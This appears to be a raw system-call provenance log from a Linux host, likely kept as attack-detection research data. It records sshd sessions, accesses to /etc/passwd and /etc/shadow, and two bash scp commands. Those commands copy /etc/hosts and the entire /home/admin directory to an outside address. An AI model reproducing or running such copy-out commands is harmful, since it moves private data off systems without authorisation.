1558040444.698:1801043383,24569473-F6B9-27A0-53A4-336EB4BACC6B:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040444.690:1801043126,F69AA0C7-4158-9932-4AC2-B8593F9EB20F:sshd,EXECUTE,24569473-F6B9-27A0-53A4-336EB4BACC6B,sshd,null
1558040444.690:1801043105,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,F69AA0C7-4158-9932-4AC2-B8593F9EB20F,sshd,null
1558040444.550:1801042539,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040444.550:1801042526,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040444.550:1801042411,DC31BAE2-559B-6D15-2CB1-B013CA0A5E51:sshd,CHANGE_PRINCIPAL,B71006B3-8832-F03F-C071-0D11CF355869,sshd,null
1558040444.550:1801042410,DC31BAE2-559B-6D15-2CB1-B013CA0A5E51:sshd,CHANGE_PRINCIPAL,DC31BAE2-559B-6D15-2CB1-B013CA0A5E51,sshd,null
1558040444.550:1801042409,B71006B3-8832-F03F-C071-0D11CF355869:sshd,CHANGE_PRINCIPAL,DC31BAE2-559B-6D15-2CB1-B013CA0A5E51,sshd,null
1558040440.430:1801040874,EACAE69A-976D-1469-0B1C-51D52AEB4D90:scp,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558040439.966:1801040761,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040758,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040755,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040752,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040749,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040746,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040743,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.966:1801040721,C67AA80A-65BC-A539-3556-318B784ADDD6:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.962:1801040626,6E92ECA6-AA6D-0919-F916-87D8A3594675:scp,EXECUTE,C67AA80A-65BC-A539-3556-318B784ADDD6,ssh,null
1558040439.962:1801040617,EACAE69A-976D-1469-0B1C-51D52AEB4D90:scp,FORK,6E92ECA6-AA6D-0919-F916-87D8A3594675,scp,null
1558040439.962:1801040610,EACAE69A-976D-1469-0B1C-51D52AEB4D90:scp,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040439.958:1801040549,ACB1335A-5945-9F23-F381-3B0509D56F15:bash,EXECUTE,EACAE69A-976D-1469-0B1C-51D52AEB4D90,b'scp -r /etc/hosts admin@128.55.12.109:.',null
1558040439.958:1801040543,9AFB1DC0-6799-BCF6-F2B1-66C7FA7E55BF:bash,FORK,ACB1335A-5945-9F23-F381-3B0509D56F15,bash,null
1558040435.386:1801035759,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.386:1801035756,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.386:1801035753,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.386:1801035750,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.386:1801035747,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.386:1801035744,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.386:1801035741,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.382:1801035719,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84:ssh,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.378:1801035624,4F671598-DD83-62BA-3515-980875F75867:scp,EXECUTE,4CCFECFD-2DC2-ACE0-7761-1029D0C25D84,ssh,null
1558040435.378:1801035615,28B929FF-4531-CD47-3394-2F83AC805D58:scp,FORK,4F671598-DD83-62BA-3515-980875F75867,scp,null
1558040435.378:1801035608,28B929FF-4531-CD47-3394-2F83AC805D58:scp,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.374:1801035547,0599E065-1A77-B602-445B-C55E8445E79E:bash,EXECUTE,28B929FF-4531-CD47-3394-2F83AC805D58,b'scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/aponeurotomy /home/admin/autocombustible /home/admin/aviarists /home/admin/backup /home/admin/bandagers /home/admin/barong /home/admin/bedlamised /home/admin/bombacaceous /home/admin/botulinuses /home/admin/boult /home/admin/brewer /home/admin/broider /home/admin/bushidos /home/admin/celebe /home/admin/chelicere /home/admin/chondropharyngeus /home/admin/cicalas /home/admin/cilices /home/admin/collyr /home/admin/composita /home/admin/convincible /home/admin/convulsedly /home/admin/copintank /home/admin/critters /home/admin/croakers /home/admin/cyanogenesis /home/admin/dealers /home/admin/decimator /home/admin/depardieu /home/admin/deposes /home/admin/deracialize /home/admin/dermobranchia /home/admin/Desktop /home/admin/desuete /home/admin/directeur /home/admin/disincrustion /home/admin/disobligation /home/admin/docs /home/admin/Documents /home/admin/dogma /home/admin/Downloads /home/admin/drumming /home/admin/dunny /home/admin/educt /home/admin/electrovection /home/admin/empiricism /home/admin/energeticalness /home/admin/eversible /home/admin/exacuate /home/admin/farandmen /home/admin/files /home/admin/finnick /home/admin/flashpan /home/admin/fleabanes /home/admin/genesiacal /home/admin/geoponical /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/grooper /home/admin/haemophilic /home/admin/halleflinta /home/admin/hauntingly /home/admin/hemophthalmia /home/admin/herpetologist /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/imposted /home/admin/imposthume /home/admin/individua /home/admin/interrogatedness /home/admin/jna-95354950 /home/admin/jockeydom /home/admin/joinable /home/admin/lewisite /home/admin/liverheartedness /home/admin/load_helper.ko /home/admin/machine /home/admin/__MACOSX /home/admin/medicamentary /home/admin/merfold /home/admin/merogenetic /home/admin/messmen /home/admin/metanitrophenol /home/admin/methene /home/admin/mignon /home/admin/minion /home/admin/misconducting /home/admin/misinters /home/admin/molligrant /home/admin/moondown /home/admin/Music /home/admin/navaids /home/admin/neurologically /home/admin/nitidulid /home/admin/nocktat /home/admin/nodeexporter /home/admin/noncrossover /home/admin/noncuratively /home/admin/nonrecombinant /home/admin/nonshatter /home/admin/olivil /home/admin/osphere /home/admin/otarian /home/admin/out10 /home/admin/out20 /home/admin/out249 /home/admin/out250 /home/admin/out514 /home/admin/out559 /home/admin/out669 /home/admin/out680 /home/admin/out724 /home/admin/out850 /home/admin/out857 /home/admin/out864 /home/admin/out888 /home/admin/out892 /home/admin/out912 /home/admin/overskirt /home/admin/overspender /home/admin/overwinning /home/admin/palestine /home/admin/panada /home/admin/parochialization /home/admin/passwd /home/admin/phyllostomatidae /home/admin/Pictures /home/admin/pisgah /home/admin/placement /home/admin/planospore /home/admin/polytype /home/admin/potholes /home/admin/precopy /home/admin/preexception /home/admin/preoccupiedness /home/admin/preppie /home/admin/prereceiver /home/admin/preserver /home/admin/pricklyback /home/admin/projections /home/admin/proterandry /home/admin/psychomoral /home/admin/Public /home/admin/pulpwoods /home/admin/pumpkinish /home/admin/quislings /home/admin/ratement /home/admin/ravi /home/admin/read_scan.ko /home/admin/referendaryship /home/admin/rerival /home/admin/restorationist /home/admin/rove /home/admin/saccharide /home/admin/sapropel /home/admin/sarcoma /home/admin/satable /home/admin/savoring /home/admin/sclerosed /home/admin/semifamine /home/admin/sequentially /home/admin/sfree /home/admin/sheaths /home/admin/sigatoka /home/admin/skiffles /home/admin/spathyema /home/admin/speirs /home/admin/spiky /home/admin/spirae /home/admin/stairbuilding /home/admin/stringsman /home/admin/subcircularity /home/admin/subimbricative /home/admin/superapologies /home/admin/supposital /home/admin/suppressants /home/admin/swiples /home/admin/tabors /home/admin/talonid /home/admin/Templates /home/admin/tennantite /home/admin/test /home/admin/tinkler /home/admin/tormentor /home/admin/tortiously /home/admin/touchless /home/admin/trachile /home/admin/trainload /home/admin/treckpot /home/admin/trillil /home/admin/tripleness /home/admin/ubuntu_pkgs /home/admin/ubuntu_pkgs.zip /home/admin/unadoptably /home/admin/undeteriorated /home/admin/unempty /home/admin/unfoughten /home/admin/unify /home/admin/uniseriately /home/admin/unloosen /home/admin/unmentioned /home/admin/unrecreational /home/admin/unsickered /home/admin/untempting /home/admin/Videos /home/admin/vilified /home/admin/vitrean /home/admin/woolsack /home/admin/work /home/admin/wurtzilite /home/admin/xvnc4viewer.deb /home/admin/yentas /home/admin/yett admin@128.55.12.109:\\C:UsersadminDocuments',null
1558040435.374:1801035541,9AFB1DC0-6799-BCF6-F2B1-66C7FA7E55BF:bash,FORK,0599E065-1A77-B602-445B-C55E8445E79E,bash,null
1558040435.194:1801032652,9AFB1DC0-6799-BCF6-F2B1-66C7FA7E55BF:bash,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.194:1801032569,FD860B58-A7B7-239E-28C9-8ACF996887D1:sshd,EXECUTE,9AFB1DC0-6799-BCF6-F2B1-66C7FA7E55BF,bash,null
1558040435.194:1801032458,3BD40856-B106-A2F6-55D7-796CDF28C0F7:sshd,FORK,FD860B58-A7B7-239E-28C9-8ACF996887D1,sshd,null
1558040435.194:1801032407,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.194:1801032401,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.190:1801032381,3AE85C61-E055-BDCF-45E3-67D8BF4855FF:sshd,CHANGE_PRINCIPAL,3BD40856-B106-A2F6-55D7-796CDF28C0F7,sshd,null
1558040435.190:1801032359,35192D79-A9F9-7E36-5AF4-E5CEE3A9BC1D:sshd,CHANGE_PRINCIPAL,3AE85C61-E055-BDCF-45E3-67D8BF4855FF,sshd,null
1558040435.190:1801032356,B71006B3-8832-F03F-C071-0D11CF355869:sshd,FORK,35192D79-A9F9-7E36-5AF4-E5CEE3A9BC1D,sshd,null
1558040435.190:1801032347,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.190:1801032311,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.190:1801032308,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.190:1801032305,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.146:1801030237,9A68C559-D47A-3876-DB12-D1DE5CD9D8CD:lsb_release,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040435.138:1801029997,D49BC3B7-5521-CC77-3749-526CD8017AD5:91-release-upgr,EXECUTE,9A68C559-D47A-3876-DB12-D1DE5CD9D8CD,lsb_release,null
1558040435.138:1801029988,03B49E69-0CD4-C3B9-78EE-096A8273E8D4:91-release-upgr,FORK,D49BC3B7-5521-CC77-3749-526CD8017AD5,91-release-upgr,null
1558040435.134:1801029981,5956115A-298F-F705-A94A-4D47F6C40A89:91-release-upgr,FORK,03B49E69-0CD4-C3B9-78EE-096A8273E8D4,91-release-upgr,null
1558040435.134:1801029959,B2247105-ED19-7681-6E3C-E454E7B5AA7F:run-parts,EXECUTE,5956115A-298F-F705-A94A-4D47F6C40A89,91-release-upgr,null
1558040435.134:1801029958,BDCF52EE-A886-7B4F-1E2C-420C671CD5CB:run-parts,FORK,B2247105-ED19-7681-6E3C-E454E7B5AA7F,run-parts,null
1558040434.986:1801021782,FD617ECD-2951-826F-3063-91BF75C055C6:landscape-sysin,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.978:1801021353,73440D7C-8982-36DB-C649-6B335D719E21:50-landscape-sy,EXECUTE,FD617ECD-2951-826F-3063-91BF75C055C6,landscape-sysin,null
1558040434.978:1801021348,1825DFA9-B084-1069-C576-AB61275CAEE2:50-landscape-sy,FORK,73440D7C-8982-36DB-C649-6B335D719E21,50-landscape-sy,null
1558040434.974:1801021105,82AB556A-5925-4302-7FF0-5B4B3634BEA8:run-parts,EXECUTE,1825DFA9-B084-1069-C576-AB61275CAEE2,50-landscape-sy,null
1558040434.974:1801021104,BDCF52EE-A886-7B4F-1E2C-420C671CD5CB:run-parts,FORK,82AB556A-5925-4302-7FF0-5B4B3634BEA8,run-parts,null
1558040434.970:1801020772,439D2EF3-ECAB-E38F-AE84-F0A2CCD00044:env,EXECUTE,BDCF52EE-A886-7B4F-1E2C-420C671CD5CB,run-parts,null
1558040434.970:1801020740,CD3F6ABA-66A6-B530-8923-0566ECDF3488:sh,EXECUTE,439D2EF3-ECAB-E38F-AE84-F0A2CCD00044,env,null
1558040434.970:1801020733,90A0A78C-97B3-DD3C-C82F-2766E0C8872E:sh,FORK,CD3F6ABA-66A6-B530-8923-0566ECDF3488,sh,null
1558040434.970:1801020695,9C7444A4-B1E9-D73E-DB20-828CEE054BCD:sshd,EXECUTE,90A0A78C-97B3-DD3C-C82F-2766E0C8872E,sh,null
1558040434.970:1801020678,B71006B3-8832-F03F-C071-0D11CF355869:sshd,FORK,9C7444A4-B1E9-D73E-DB20-828CEE054BCD,sshd,null
1558040434.970:1801020646,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.950:1801020492,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.950:1801020441,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.950:1801020429,6BDC05B1-DE88-DECC-3681-4985EAB00A17:sshd,CHANGE_PRINCIPAL,B71006B3-8832-F03F-C071-0D11CF355869,sshd,null
1558040434.950:1801020428,0357E19C-3A87-933D-3CC4-F41D6961B100:sshd,CHANGE_PRINCIPAL,6BDC05B1-DE88-DECC-3681-4985EAB00A17,sshd,null
1558040434.950:1801020427,6BDC05B1-DE88-DECC-3681-4985EAB00A17:sshd,CHANGE_PRINCIPAL,0357E19C-3A87-933D-3CC4-F41D6961B100,sshd,null
1558040434.950:1801020426,B71006B3-8832-F03F-C071-0D11CF355869:sshd,CHANGE_PRINCIPAL,6BDC05B1-DE88-DECC-3681-4985EAB00A17,sshd,null
1558040434.950:1801020424,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.950:1801020410,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.950:1801020370,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558040434.950:1801020367,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.942:1801020342,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558040434.942:1801020339,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.838:1801020115,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.838:1801020083,B71006B3-8832-F03F-C071-0D11CF355869:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558040434.838:1801020082,B71006B3-8832-F03F-C071-0D11CF355869:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558040434.750:1801019867,B71006B3-8832-F03F-C071-0D11CF355869:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040434.746:1801019611,65EE160E-97FF-12AE-662A-4B546928C942:sshd,EXECUTE,B71006B3-8832-F03F-C071-0D11CF355869,sshd,null
1558040434.742:1801019590,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,65EE160E-97FF-12AE-662A-4B546928C942,sshd,null
1558040412.562:1801007964,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.562:1801007886,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.562:1801007812,55A43884-35FF-9435-ADB7-CD0A8A144387:sshd,CHANGE_PRINCIPAL,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED,sshd,null
1558040412.562:1801007811,55A43884-35FF-9435-ADB7-CD0A8A144387:sshd,CHANGE_PRINCIPAL,55A43884-35FF-9435-ADB7-CD0A8A144387,sshd,null
1558040412.562:1801007810,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,CHANGE_PRINCIPAL,55A43884-35FF-9435-ADB7-CD0A8A144387,sshd,null
1558040412.278:1801004936,9E7F00AE-6383-E251-DC5D-FDC7402CBDDC:bash,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.278:1801004853,90524B25-A3C7-C74F-1FC4-E46AAF11BD97:sshd,EXECUTE,9E7F00AE-6383-E251-DC5D-FDC7402CBDDC,bash,null
1558040412.278:1801004739,F999052D-3119-1EC4-1FAE-CFF459BF921E:sshd,FORK,90524B25-A3C7-C74F-1FC4-E46AAF11BD97,sshd,null
1558040412.278:1801004688,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.278:1801004682,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.278:1801004662,0CD13FBD-E4F7-9324-CBE2-40FCA0D519A0:sshd,CHANGE_PRINCIPAL,F999052D-3119-1EC4-1FAE-CFF459BF921E,sshd,null
1558040412.278:1801004640,7887DF20-0578-3329-4B56-D034E0A2E6B6:sshd,CHANGE_PRINCIPAL,0CD13FBD-E4F7-9324-CBE2-40FCA0D519A0,sshd,null
1558040412.274:1801004637,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,FORK,7887DF20-0578-3329-4B56-D034E0A2E6B6,sshd,null
1558040412.274:1801004628,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.274:1801004592,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.274:1801004589,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.274:1801004586,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.230:1801002518,1F3A1CCD-1576-8AB0-B6AB-F40727ACBFC2:lsb_release,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.218:1801002278,1C708945-2BEC-66FD-AB19-300E92613B05:91-release-upgr,EXECUTE,1F3A1CCD-1576-8AB0-B6AB-F40727ACBFC2,lsb_release,null
1558040412.218:1801002269,1F5ACACC-B237-AE12-183D-9A4FAB2B155B:91-release-upgr,FORK,1C708945-2BEC-66FD-AB19-300E92613B05,91-release-upgr,null
1558040412.218:1801002262,2FBBC3DD-D5D4-7EA8-439A-5AF73E539479:91-release-upgr,FORK,1F5ACACC-B237-AE12-183D-9A4FAB2B155B,91-release-upgr,null
1558040412.218:1801002240,CBDEF809-AC0A-A213-7B41-DDF10336A8D0:run-parts,EXECUTE,2FBBC3DD-D5D4-7EA8-439A-5AF73E539479,91-release-upgr,null
1558040412.218:1801002239,E9338672-8DCD-C61B-35D8-3CA0D0099992:run-parts,FORK,CBDEF809-AC0A-A213-7B41-DDF10336A8D0,run-parts,null
1558040412.062:1800993951,FC007076-1E43-A8A3-BAA4-367E76AFC83C:landscape-sysin,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.054:1800993570,9EEDB855-AE8E-43AE-8ECB-3C3F81E1E507:50-landscape-sy,EXECUTE,FC007076-1E43-A8A3-BAA4-367E76AFC83C,landscape-sysin,null
1558040412.054:1800993565,3C1CB90A-DFCF-5A3F-A232-21C30A6A8C30:50-landscape-sy,FORK,9EEDB855-AE8E-43AE-8ECB-3C3F81E1E507,50-landscape-sy,null
1558040412.050:1800993328,3C432CE7-6572-42F8-9C01-9B250DDAE386:run-parts,EXECUTE,3C1CB90A-DFCF-5A3F-A232-21C30A6A8C30,50-landscape-sy,null
1558040412.050:1800993324,E9338672-8DCD-C61B-35D8-3CA0D0099992:run-parts,FORK,3C432CE7-6572-42F8-9C01-9B250DDAE386,run-parts,null
1558040412.046:1800993011,17583958-E817-8913-B0A2-65539274A1AD:env,EXECUTE,E9338672-8DCD-C61B-35D8-3CA0D0099992,run-parts,null
1558040412.046:1800992992,3EE0745E-E989-9398-ABFC-7705F42B5DBA:sh,EXECUTE,17583958-E817-8913-B0A2-65539274A1AD,env,null
1558040412.046:1800992990,40A62D12-3D95-C70F-BBA4-7662177F9BCF:sh,FORK,3EE0745E-E989-9398-ABFC-7705F42B5DBA,sh,null
1558040412.046:1800992950,7A999AC4-6C0A-A757-044B-C4A7682BFE1E:sshd,EXECUTE,40A62D12-3D95-C70F-BBA4-7662177F9BCF,sh,null
1558040412.046:1800992928,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,FORK,7A999AC4-6C0A-A757-044B-C4A7682BFE1E,sshd,null
1558040412.046:1800992888,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.014:1800992520,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.014:1800992469,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.014:1800992457,81B3DAD3-0DCF-9FCF-148B-6EB3744D1C07:sshd,CHANGE_PRINCIPAL,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED,sshd,null
1558040412.014:1800992456,F03CF9DD-B6A0-D03F-3C81-E6247699DE99:sshd,CHANGE_PRINCIPAL,81B3DAD3-0DCF-9FCF-148B-6EB3744D1C07,sshd,null
1558040412.014:1800992455,81B3DAD3-0DCF-9FCF-148B-6EB3744D1C07:sshd,CHANGE_PRINCIPAL,F03CF9DD-B6A0-D03F-3C81-E6247699DE99,sshd,null
1558040412.014:1800992454,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,CHANGE_PRINCIPAL,81B3DAD3-0DCF-9FCF-148B-6EB3744D1C07,sshd,null
1558040412.014:1800992452,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.014:1800992438,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.014:1800992397,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558040412.014:1800992394,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040412.006:1800992369,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558040412.006:1800992366,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040411.902:1800992143,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040411.902:1800992111,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558040411.902:1800992110,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558040411.814:1800991895,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
1558040411.810:1800991639,246D7055-E28B-B3A0-2449-B35701B080E0:sshd,EXECUTE,A1C1E93C-BB55-DE98-DC48-30E2DBF601ED,sshd,null
1558040411.810:1800991618,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,246D7055-E28B-B3A0-2449-B35701B080E0,sshd,null
1558040409.662:1800987412,37A7A518-CD81-9817-FE7B-858C862E911C:sshd,MMAP,3C420BC3-5D7D-362C-D00C-5B266CAF1120,/etc/passwd,null
